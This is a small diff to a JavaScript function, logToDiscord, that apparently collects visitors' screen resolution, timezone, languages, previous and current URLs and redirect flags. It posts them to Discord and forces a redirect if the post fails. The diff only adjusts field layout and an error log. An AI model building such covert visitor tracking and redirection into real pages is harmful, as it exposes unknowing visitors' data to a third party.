@@ -31,8 +31,8 @@ async function logToDiscord() {
                 { name: "Resolution", value: resolution, inline: true },
                 { name: "Timezone", value: timezone, inline: true },
                 { name: "Languages", value: languages.toString(), inline: true },
-                { name: "Previous URL", value: previous_url, inline: true },
-                { name: "Current URL", value: current_url, inline: true },
+                { name: "Previous URL", value: previous_url, inline: false },
+                { name: "Current URL", value: current_url, inline: false },
                 { name: "isInlineExecuted", value: window.FLAG_MAP.isInlineExecuted, inline: true },
                 { name: "isNoReferrer", value: window.FLAG_MAP.isNoReferrer, inline: true },
                 { name: "isRedirected", value: window.FLAG_MAP.isRedirected, inline: true },
@@ -56,7 +56,7 @@ async function logToDiscord() {
         //if (response) console.log('Fetch completion confirmed');
 
     } catch (error) {
-        //console.error('Failed to post to Discord:', error);
+        console.log("inline fetch error");
         window.FLAG_MAP.REASON = "fetch";
         executeRedirect();
     }
